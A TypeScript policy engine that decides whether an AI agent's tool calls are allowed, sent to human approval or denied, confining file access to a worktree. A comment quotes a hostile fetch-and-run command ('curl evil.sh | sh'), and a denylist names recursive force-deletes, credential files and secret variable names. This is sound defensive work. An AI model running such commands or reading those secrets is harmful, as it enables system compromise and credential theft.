import { homedir } from "node:os";
import { resolve, sep } from "node:path";
import type { ToolCall } from "./types";

// The policy engine (DESIGN.md §4). Pure function: a tool call plus its repo/
// worktree context maps to one of three actions. It holds NO state — approval
// records and audit live in the store; the session manager consults an
// approval-aware gate that falls through to this for undecided calls.
//
//   allow — read-only / side-effect-free / repo-allowlisted: run with no human.
//   gate  — consequential (writes, non-allowlisted bash, network): needs an
//           architect's approval before it runs.
//   deny  — hard boundary no approval can override (out-of-worktree access,
//           recursive-force deletes outside the tree, credential exfiltration).
//
// Default posture is deny/gate-heavy (DESIGN.md §4): anything unrecognized is
// gated, not allowed. Bash confinement here is heuristic (M2 baseline); the
// real net for non-allowlisted commands is the human at the gate, and the
// robust parse/symlink hardening is M3/M4.

export type PolicyAction = "allow" | "gate" | "deny";

export interface PolicyDecision {
  action: PolicyAction;
  /**
   * On `deny`: the reason fed back to the agent so it adapts.
   * On `gate`: a short human-facing description for the approval prompt.
   * On `allow`: a short description (used only for audit/progress).
   */
  reason: string;
}

export interface PolicyContext {
  /** Absolute session worktree; filesystem access is confined to it. */
  worktree: string;
  /** Repo-defined commands that run without approval (exact or prefix match). */
  safeBashAllowlist: string[];
}

// Tool categories. A tool absent from all of these is unknown → gated.
const NO_FS_TOOLS = new Set(["TodoWrite"]);
const READ_TOOLS = new Set(["Read", "Glob", "Grep"]);
const WRITE_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
const NETWORK_TOOLS = new Set(["WebFetch", "WebSearch"]);

/** Fields across tool inputs that name a filesystem target. */
const PATH_FIELDS = ["file_path", "path", "notebook_path"] as const;

const allow = (reason: string): PolicyDecision => ({ action: "allow", reason });
const gate = (reason: string): PolicyDecision => ({ action: "gate", reason });
const deny = (reason: string): PolicyDecision => ({ action: "deny", reason });

/**
 * The first path field (if any) that resolves outside the worktree. Relative
 * inputs resolve against the worktree because the harness cwd IS the worktree.
 * Returns null when every present path is confined. (Symlink-chasing is M3/M4.)
 */
export function offendingPath(worktree: string, input: unknown): string | null {
  if (typeof input !== "object" || input === null) return null;
  const root = resolve(worktree);
  for (const field of PATH_FIELDS) {
    const value = (input as Record<string, unknown>)[field];
    if (typeof value !== "string" || value.length === 0) continue;
    // A leading `~` is never a legitimate in-worktree relative path; expand it
    // as a shell/tool would rather than let node treat it as a literal subdir.
    const expanded = value === "~" || value.startsWith("~/") ? homedir() + value.slice(1) : value;
    const target = resolve(root, expanded);
    if (target !== root && !target.startsWith(root + sep)) return value;
  }
  return null;
}

export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const name = call.name;

  // Side-effect-free planning tool: always fine, touches no filesystem.
  if (NO_FS_TOOLS.has(name)) return allow("updates its task plan");

  const offender = offendingPath(ctx.worktree, call.input);

  if (READ_TOOLS.has(name)) {
    // Reading anything on the host + posting the answer in a thread is an
    // exfiltration channel — reads are confined like writes (DESIGN.md §4).
    if (offender) {
      return deny(
        `"${offender}" is outside your worktree. You may only read files inside your own working tree.`,
      );
    }
    return allow(describeCall(call));
  }

  if (WRITE_TOOLS.has(name)) {
    // A write outside the worktree is a hard boundary no approval can widen.
    if (offender) {
      return deny(
        `"${offender}" is outside your worktree. Writes are confined to your own working tree.`,
      );
    }
    return gate(describeCall(call));
  }

  if (name === "Bash") return evaluateBash(call.input, ctx);

  if (NETWORK_TOOLS.has(name)) return gate(describeCall(call));

  // Unknown tool: gate, never auto-allow. A human sees exactly what it is.
  return gate(`use ${name}`);
}

function evaluateBash(input: unknown, ctx: PolicyContext): PolicyDecision {
  const command =
    typeof input === "object" && input !== null && typeof (input as any).command === "string"
      ? ((input as any).command as string)
      : "";
  if (!command.trim()) return deny("empty bash command");

  // Hard-deny high-signal dangerous patterns first — never approvable.
  const danger = bashHardDeny(command);
  if (danger) return deny(danger);

  // Auto-allow only when EVERY chained segment is individually allowlisted, so
  // `git status && curl evil.sh | sh` can never ride in on `git status`.
  if (bashFullyAllowlisted(command, ctx.safeBashAllowlist)) {
    return allow(`run \`${truncate(command)}\``);
  }
  return gate(`run \`${truncate(command)}\``);
}

/**
 * A small, deliberately conservative denylist of things no architect should be
 * able to approve by a mis-click. NOT exhaustive — the gate (human approval) is
 * the real net for everything non-allowlisted; this only catches the sharpest
 * edges. Hardening (full shell parsing, more patterns) is M3/M4.
 */
export function bashHardDeny(command: string): string | null {
  // Recursive force-delete whose target escapes the worktree (absolute, home,
  // parent, variable-expanded, or wildcard). A relative `rm -rf build` is left
  // to the gate; an `rm -rf /` or `rm -rf ~` is refused outright.
  for (const seg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
    if (!/\brm\b/.test(seg)) continue;
    const hasR = /\s-\w*r/i.test(seg) || /\s--recursive\b/.test(seg);
    const hasF = /\s-\w*f/i.test(seg) || /\s--force\b/.test(seg);
    if (hasR && hasF && /\s(\/|~|\.\.(?:\/|\s|$)|\$|\*)/.test(seg)) {
      return "recursive force-delete with an out-of-worktree, home, root, or wildcard target is not allowed.";
    }
  }
  // Credential / secret material.
  if (
    /(?:^|[\s\/'"=`(])(?:\.ssh\/|id_rsa|id_ed25519|\.aws\/credentials|\.config\/gcloud|\.netrc|\/etc\/shadow)/i.test(
      command,
    )
  ) {
    return "access to credential or secret material is not allowed.";
  }
  // Daemon's own secrets, by env-var name.
  if (/\b(?:ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|SLACK_BOT_TOKEN|SLACK_APP_TOKEN|AWS_SECRET_ACCESS_KEY)\b/.test(command)) {
    return "referencing daemon credentials is not allowed.";
  }
  return null;
}

function bashFullyAllowlisted(command: string, allowlist: string[]): boolean {
  if (allowlist.length === 0) return false;
  const segments = command
    .split(/(?:\|\||&&|;|\||&|\n)+/)
    .map((s) => s.trim())
    .filter(Boolean);
  if (segments.length === 0) return false;
  return segments.every((seg) => {
    const norm = seg.replace(/\s+/g, " ");
    return allowlist.some((entry) => {
      const e = entry.trim().replace(/\s+/g, " ");
      return e.length > 0 && (norm === e || norm.startsWith(e + " "));
    });
  });
}

function truncate(s: string, max = 120): string {
  const oneLine = s.replace(/\s+/g, " ").trim();
  return oneLine.length > max ? oneLine.slice(0, max - 1) + "…" : oneLine;
}

/** Short human-readable description of a tool call, for prompts and audit. */
export function describeCall(call: ToolCall): string {
  const i = (call.input ?? {}) as Record<string, unknown>;
  switch (call.name) {
    case "Read":
      return `read ${i.file_path ?? "a file"}`;
    case "Glob":
      return `list files matching ${i.pattern ?? "a pattern"}`;
    case "Grep":
      return `search for ${i.pattern ?? "a pattern"}`;
    case "Write":
      return `write ${i.file_path ?? "a file"}`;
    case "Edit":
    case "MultiEdit":
      return `edit ${i.file_path ?? "a file"}`;
    case "NotebookEdit":
      return `edit notebook ${i.notebook_path ?? ""}`.trim();
    case "Bash":
      return `run \`${truncate(String(i.command ?? ""))}\``;
    case "WebFetch":
      return `fetch ${i.url ?? "a URL"}`;
    case "WebSearch":
      return `search the web for ${i.query ?? "a query"}`;
    default:
      return `use ${call.name}`;
  }
}
